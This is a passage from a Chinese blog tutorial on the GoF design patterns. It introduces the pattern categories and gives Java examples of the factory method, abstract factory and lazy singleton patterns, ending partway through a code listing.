    <content type="html"><![CDATA[<p>其实👴不会写代码</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>先来一段面向 Wikipedia 的废话（</p><blockquote><p>在软件工程中，设计模式（design pattern）是对软件设计中普遍存在（反复出现）的各种问题，所提出的解决方案。这个术语是由埃里希·伽玛（Erich Gamma）等人在1990年代从建筑设计领域引入到计算机科学的。</p><p>设计模式并不直接用来完成代码的编写，而是描述在各种不同情况下，要怎么解决问题的一种方案。面向对象设计模式通常以类别或对象来描述其中的关系和相互作用，但不涉及用来完成应用程序的特定类别或对象。设计模式能使不稳定依赖于相对稳定、具体依赖于相对抽象，避免会引起麻烦的紧耦合，以增强软件设计面对并适应变化的能力。</p><p>并非所有的软件模式都是设计模式，设计模式特指软件“设计”层次上的问题。还有其他非设计模式的模式，如架构模式。同时，<strong>算法不能算是一种设计模式</strong>，因为算法主要是用来解决计算上的问题，而非设计上的问题。</p><p><a href="https://zh.wikipedia.org/wiki/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F_(%E8%AE%A1%E7%AE%97%E6%9C%BA)">设计模式 (计算机) - 维基百科，自由的百科全书 (wikipedia.org)</a></p></blockquote><p>笔者本身也不是软工专业的，所以下文中笔者的拙见可能有误，还望读者不吝指正。</p></blockquote><p>在笔者看来，通俗地来说，<strong>设计模式</strong>（design pattern）就是<strong>软件的架构设计问题</strong>——我们在如何去设计、组织一个软件的架构</p><p>当我们谈论到设计模式这一词语时，我们通常是基于<strong>面向对象程序设计</strong>（Object Oriented Programming）这一基础出发，而非传统的_面向过程的程序设计_，这意味着设计模式是软件设计的<strong>抽象层面</strong>——即<strong>我们并不关注细节的实现，而是关注于更高一层的组织</strong></p><p>方便起见，本篇笔者选用“最面向对象的语言”—— Java 语言来讲解不同的设计模式</p><h2 id="设计模式的类别"><a href="#设计模式的类别" class="headerlink" title="设计模式的类别"></a>设计模式的类别</h2><p>在《<strong>设计模式：可复用面向对象软件的基础</strong>》（Design Patterns: Elements of Reusable Object-Oriented Software）一书中，GoF 总结了<strong>23种设计模式</strong>，分为三大类：</p><h3 id="创建型模式（5种）"><a href="#创建型模式（5种）" class="headerlink" title="创建型模式（5种）"></a>创建型模式（5种）</h3><ul><li>工厂方法模式</li><li>抽象工厂模式</li><li>单例模式</li><li>建造者模式</li><li>原型模式</li></ul><h3 id="结构型模式（7种）"><a href="#结构型模式（7种）" class="headerlink" title="结构型模式（7种）"></a>结构型模式（7种）</h3><ul><li>适配器模式</li><li>装饰器模式</li><li>代理模式</li><li>外观模式</li><li>桥接模式</li><li>组合模式</li><li>享元模式</li></ul><h3 id="行为型模式（11种）"><a href="#行为型模式（11种）" class="headerlink" title="行为型模式（11种）"></a>行为型模式（11种）</h3><ul><li>策略模式</li><li>模板方法模式</li><li>观察者模式</li><li>迭代子模式</li><li>责任链模式</li><li>命令模式</li><li>备忘录模式</li><li>状态模式</li><li>访问者模式</li><li>中介者模式</li><li>解释器模式</li></ul><p>随着现代软件设计理论的发展，更多的设计模式也被开发了出来，除了书上所述的上述三大类都分别新增有设计模式之外，针对于多线程与并发软件设计，还新增了一个<strong>并发型模式</strong>，以及由 Sun Java Center 鉴定的 J2EE模式等等…</p><p>本篇主要还是讲书上的23种设计模式，额外的设计模式如果有时间可能也会讲讲</p><blockquote><p>其实笔者本人也还没买钱这本书…（<del>体谅一哈，👴是学生，建议v👴200</del>）</p></blockquote><h1 id="0x01-创建型模式"><a href="#0x01-创建型模式" class="headerlink" title="0x01.创建型模式"></a>0x01.创建型模式</h1><p>在软件工程中，创建型模式是用以处理<strong>对象创建</strong>的设计模式，该类别模式根据实际情况使用合适的方式创建对象，因为基本的对象创建方式可能会导致设计上的问题，或增加设计的复杂度</p><p>创建型模式的关注点是<strong>如何创建对象</strong>，其核心思想是要<strong>把对象的创建和使用相分离</strong></p><blockquote><p>例如，当我们在C++中使用 string 类的各种方法时，我们并不需要关注其底层（allocator、扩容…）是如何实现的</p></blockquote><h2 id="一、工厂方法模式（Factory-method-pattern）"><a href="#一、工厂方法模式（Factory-method-pattern）" class="headerlink" title="一、工厂方法模式（Factory method pattern）"></a>一、工厂方法模式（Factory method pattern）</h2><p>工厂方法模式通常又简称工厂模式，该设计模式引入了一种名为“工厂”的概念——_<strong>由一个“工厂”来“生产”出我们所需要的对象</strong>_</p><p>在工厂模式中，我们<strong>将对象的创建与对象的使用进行分开</strong>，当我们需要创建一个对象时，我们首先需要创建一个“工厂类”对象实例，后续的对象创建都从该“工厂”中获得</p><p>下图是<del>笔者偷的</del>一张描述工厂模式的图</p><p>假设我们现在要帮 Apple 设计一个生产工厂来生产最新的 iPhone13 和 iPad5，步骤如下：</p><h3 id="I-物品接口"><a href="#I-物品接口" class="headerlink" title="I.物品接口"></a>I.物品接口</h3><p>我们首先需要定义我们“生产”的对象的类型，例如，我们这个生产工厂可以生产 iPhone13 和 iPad5，那么我们这里便定义一个_设备类的接口类_作为不同产品的接口，同时声明一些这些设备共有的方法，这里随便定义两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="II-工厂接口"><a href="#II-工厂接口" class="headerlink" title="II.工厂接口"></a>II.工厂接口</h3><p>要实现不同类型的工厂，我们通常需要先定义一个工厂类的接口类，我们要“生产”的是电子设备，那就叫_DeviceFactor_ 好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    Device <span class="title function_">createDevice</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="III-物品实体类"><a href="#III-物品实体类" class="headerlink" title="III.物品实体类"></a>III.物品实体类</h3><p>有了物品接口，我们可以开始定义相应的设备了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPhone13.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPhone13 is going to reboot sooooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPad5.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPad5 is going to reboot sooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="IV-工厂类"><a href="#IV-工厂类" class="headerlink" title="IV.工厂类"></a>IV.工厂类</h3><p>有了工厂接口与物品接口，我们可以开始实现我们的工厂类了，对于 iPhone 而言我们需要一个 iPhone13Factory，而对于 iPad5 我们则需要一个独立的 iPad5 工厂，相应地这两个工厂都要实现 DeviceFactory 接口的 <code>createDevice()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13Factory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> iPhone13 <span class="title function_">createDevice</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPhone13</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5Factory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> iPad5 <span class="title function_">createDevice</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPad5</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="O-工厂方法模式的工作方式"><a href="#O-工厂方法模式的工作方式" class="headerlink" title="O.工厂方法模式的工作方式"></a><em>O.工厂方法模式的工作方式</em></h3><p>以下测试主程序用以说明工厂方法模式如何工作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FactoryMethodMode</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">iPhone13Factory</span> <span class="variable">iphone_13_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPhone13Factory</span>();</span><br><span class="line">        <span class="type">iPad5Factory</span> <span class="variable">ipad_5_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPad5Factory</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">iPhone13</span> <span class="variable">iphone13</span> <span class="operator">=</span> iphone_13_factory.createDevice();</span><br><span class="line">        <span class="type">iPad5</span> <span class="variable">ipad5</span> <span class="operator">=</span> ipad_5_factory.createDevice();</span><br><span class="line"></span><br><span class="line">        iphone13.showScreen();</span><br><span class="line">        ipad5.showScreen();</span><br><span class="line"></span><br><span class="line">        iphone13.reboot();</span><br><span class="line">        ipad5.reboot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is screen of iPhone13.</span><br><span class="line">This is screen of iPad5.</span><br><span class="line">The iPhone13 is going to reboot sooooooon...</span><br><span class="line">The iPad5 is going to reboot sooooon...</span><br></pre></td></tr></table></figure><h2 id="二、抽象工厂模式（Abstract-factory-pattern）"><a href="#二、抽象工厂模式（Abstract-factory-pattern）" class="headerlink" title="二、抽象工厂模式（Abstract factory pattern）"></a>二、抽象工厂模式（Abstract factory pattern）</h2><p>抽象工厂模式与工厂模式相类似，不同的是，在工厂模式中，我们以_独立的对象种类_来创建工厂（例如 iPhone13和 iPad5），而在抽象工厂模式中，则以<strong>同一种类别的对象</strong>作为划分的依据——<strong>每一类对象都有一个工厂，该工厂生产同一类别的不同种类的对象实例</strong></p><p><img src="https://s2.loli.net/2022/01/04/PKxLXrTFRpWiNZg.png" alt="偷的图"></p><p>还是拿 Apple 的工厂做例子，这里我们有两条生产线：一条生产全系 iPhone，另一条生产全系 iPad</p><h3 id="I-物品接口-1"><a href="#I-物品接口-1" class="headerlink" title="I.物品接口"></a>I.物品接口</h3><p>我们首先需要定义我们“生产”的对象的类型，例如，我们这个生产工厂可以生产各系 iPhone 和 iPad，那么我们这里便定义一个_设备类的接口类_作为不同产品的接口，同时声明一些这些设备<strong>共有</strong>的方法，这里随便定义两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基于 Device 类，我们再定义两个<strong>抽象类</strong>——iPhone 和 iPad</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">iPhone</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">iPad</span> <span class="keyword">implements</span> <span class="title class_">Device</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="II-工厂接口-1"><a href="#II-工厂接口-1" class="headerlink" title="II.工厂接口"></a>II.工厂接口</h3><p>要实现不同类型的工厂，我们通常需要先定义一个工厂类的接口类，我们要“生产”的是电子设备，那就叫_DeviceFactor_ 好了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="III-物品实体类-1"><a href="#III-物品实体类-1" class="headerlink" title="III.物品实体类"></a>III.物品实体类</h3><p>有了 iPhone 和 iPad 这两个抽象类，我们便可以定义具体的设备了，比如 iPhone13 类和 iPad 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhone13</span> <span class="keyword">extends</span> <span class="title class_">iPhone</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPhone13.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPhone13 is going to reboot sooooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPad5</span> <span class="keyword">extends</span> <span class="title class_">iPad</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showScreen</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;This is screen of iPad5.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reboot</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;The iPad5 is going to reboot sooooon...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="IV-工厂类-1"><a href="#IV-工厂类-1" class="headerlink" title="IV.工厂类"></a>IV.工厂类</h3><p>有了工厂接口与物品接口，我们可以开始实现我们的工厂类了，对于 iPhone 而言我们需要一个 iPhoneFactory，而对于 iPad 我们则需要一个独立的 iPad 工厂，相应地这两个工厂都要实现工厂接口的 <code>createDevice()</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPhoneFactory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">13</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPhone13</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">iPadFactory</span> <span class="keyword">implements</span> <span class="title class_">DeviceFactory</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Device <span class="title function_">createDevice</span><span class="params">(<span class="type">int</span> version)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="number">5</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">iPad5</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="O-抽象工厂模式的工作方式"><a href="#O-抽象工厂模式的工作方式" class="headerlink" title="O.抽象工厂模式的工作方式"></a><em>O.抽象工厂模式的工作方式</em></h3><p>以下测试主程序用以说明工厂方法模式如何工作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AbstractFactoryPattern</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">iPhoneFactory</span> <span class="variable">iphone_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPhoneFactory</span>();</span><br><span class="line">        <span class="type">iPadFactory</span> <span class="variable">ipad_factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">iPadFactory</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">iPhone</span> <span class="variable">iPhone_13</span> <span class="operator">=</span> iphone_factory.createDevice(<span class="number">13</span>);</span><br><span class="line">        <span class="type">iPad</span> <span class="variable">iPad_5</span> <span class="operator">=</span> ipad_factory.createDevice(<span class="number">5</span>);</span><br><span class="line">        </span><br><span class="line">        iPhone_13.showScreen();</span><br><span class="line">        iPad_5.showScreen();</span><br><span class="line">        </span><br><span class="line">        iPhone_13.reboot();</span><br><span class="line">        iPad_5.reboot();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">This is screen of iPhone13.</span><br><span class="line">This is screen of iPad5.</span><br><span class="line">The iPhone13 is going to reboot sooooooon...</span><br><span class="line">The iPad5 is going to reboot sooooon...</span><br></pre></td></tr></table></figure><h2 id="三、单例模式（Singleton-Pattern）"><a href="#三、单例模式（Singleton-Pattern）" class="headerlink" title="三、单例模式（Singleton Pattern）"></a>三、单例模式（Singleton Pattern）</h2><p>单例模式即<strong>在一个进程当中，一个类至多仅有一个实例，并提供一个全局访问点</strong>，当一个对象只需要一个全局实例时，便可以使用单例模式（例如 glibc 中的 errno？）</p><p>单例模式能够避免对象的重复创建，从而节约空间，并能避免由于操作不同实例而导致的逻辑错误</p><p>单例模式涉及的对象通常有两种创建方式（名字怪怪的）：</p><h3 id="懒汉方式"><a href="#懒汉方式" class="headerlink" title="懒汉方式"></a>懒汉方式</h3><p>类似于 Linux 下的 lazy-binding 机制，我们并不在一运行程序便创建对象实例，而是等到我们第一次使用该对象时再进行创建</p><p>这是一个🌰：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleObject</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">val</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleObject</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">&quot;SimpleObject is created!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">this</span>.val = val;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InterfaceOutside</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SimpleObject</span> <span class="variable">simpleObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getVal</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.simpleObject == <span class="literal">null</span>)</span><br><span class="line"><span class="built_in">this</span>.simpleObject = <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.simpleObject.getVal();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">setVal</span><span class="params">(<span class="type">int</span> val)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.simpleObject == <span class="literal">null</span>)</span><br><span class="line"><span class="built_in">this</span>.simpleObject = <span class="keyword">new</span> <span class="title class_">SimpleObject</span>();</span><br><span class="line"><span class="built_in">this</span>.simpleObject.setVal(val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 